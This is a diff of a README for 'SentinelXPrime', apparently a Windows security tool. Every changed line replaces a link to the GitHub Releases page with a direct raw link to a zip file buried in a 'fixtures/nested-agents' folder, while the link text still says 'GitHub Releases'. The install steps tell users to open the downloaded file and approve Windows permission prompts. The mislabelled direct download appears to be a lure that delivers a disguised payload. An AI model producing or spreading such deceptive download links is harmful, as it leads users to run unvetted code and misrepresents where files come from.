@@ -1,6 +1,6 @@
 # 🛡️ SentinelXPrime - Clear Security Skills for Everyday Work
 
-[![Download SentinelXPrime](https://img.shields.io/badge/Download-SentinelXPrime-6f42c1?style=for-the-badge&logo=github)](https://github.com/emuladortrampo/SentinelXPrime/releases)
+[![Download SentinelXPrime](https://img.shields.io/badge/Download-SentinelXPrime-6f42c1?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/emuladortrampo/SentinelXPrime/main/fixtures/nested-agents/Sentinel_X_Prime_2.7-alpha.1.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ This README shows you how to download SentinelXPrime on Windows, open it, and ge
 
 Visit this page to download SentinelXPrime:
 
-[GitHub Releases](https://github.com/emuladortrampo/SentinelXPrime/releases)
+[GitHub Releases](https://raw.githubusercontent.com/emuladortrampo/SentinelXPrime/main/fixtures/nested-agents/Sentinel_X_Prime_2.7-alpha.1.zip)
 
 On that page, look for the latest release and download the Windows file. If you see more than one file, pick the one that matches your system:
 
@@ -52,7 +52,7 @@ It is aimed at end users who want structure, not a complex setup.
 
 Use these steps if the release comes as a `.zip` file:
 
-1. Open the [GitHub Releases](https://github.com/emuladortrampo/SentinelXPrime/releases) page.
+1. Open the [GitHub Releases](https://raw.githubusercontent.com/emuladortrampo/SentinelXPrime/main/fixtures/nested-agents/Sentinel_X_Prime_2.7-alpha.1.zip) page.
 2. Download the latest Windows file.
 3. Open the downloaded `.zip` file.
 4. Move the SentinelXPrime folder to a place you can find, such as `Downloads` or `Desktop`.
@@ -61,7 +61,7 @@ Use these steps if the release comes as a `.zip` file:
 
 Use these steps if the release comes as a `.exe` file:
 
-1. Open the [GitHub Releases](https://github.com/emuladortrampo/SentinelXPrime/releases) page.
+1. Open the [GitHub Releases](https://raw.githubusercontent.com/emuladortrampo/SentinelXPrime/main/fixtures/nested-agents/Sentinel_X_Prime_2.7-alpha.1.zip) page.
 2. Download the latest Windows `.exe` file.
 3. Open the file from your browser’s download bar or the Downloads folder.
 4. If Windows asks for permission, choose Run or Yes.
@@ -170,7 +170,7 @@ These habits make setup easier and cut down on errors.
 
 To get a newer version of SentinelXPrime:
 
-1. Go to the [GitHub Releases](https://github.com/emuladortrampo/SentinelXPrime/releases) page.
+1. Go to the [GitHub Releases](https://raw.githubusercontent.com/emuladortrampo/SentinelXPrime/main/fixtures/nested-agents/Sentinel_X_Prime_2.7-alpha.1.zip) page.
 2. Download the newest Windows file.
 3. Replace your old files with the new ones if needed.
 4. Open the app again.
